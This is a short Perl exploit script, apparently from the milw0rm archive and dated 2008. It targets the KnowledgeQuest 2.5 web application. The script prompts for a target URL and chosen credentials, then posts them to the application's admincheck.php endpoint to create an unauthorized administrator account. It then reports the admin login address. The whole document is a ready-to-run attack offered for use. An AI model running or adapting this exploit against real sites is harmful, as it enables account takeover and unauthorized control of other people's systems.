#!/usr/bin/perl

use strict;
use LWP::UserAgent;

print "-+------------------------------------------+-\n";
print "-+- KnowledgeQuest 2.5 Arbitrary Add Admin -+-\n";
print "-+------------------------------------------+-\n";
print "-+-     Discovered && Coded By t0pP8uzz    -+-\n";
print "-+-  This Exploit will craft a evilpacket  -+-\n";
print "-+-     which will add a admin account     -+-\n";
print "-+------------------------------------------+-\n";

print "Enter URL: ";
	chomp(my $url=<STDIN>);
	
print "Enter Username (you will login with this): ";
	chomp(my $usr=<STDIN>);

print "Enter Password (you will login with this): ";
	chomp(my $pwd=<STDIN>);

my $ua  = LWP::UserAgent->new( agent=> 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)' );
my $res = $ua->post( $url."/admincheck.php", {'username' => $usr, 'password' => $pwd, 'repas' => $pwd} );

if($res->is_success) {

	if($res->content =~ /taken by another user/i) { print "\n\nExploit Failed! Reason: username already taken!"; exit; }
	
	print "\n\nExploit Success! Login to ".$url."administratorlogin.php with username: ".$usr." and password: ".$pwd."\n";
}

# milw0rm.com [2008-04-09]
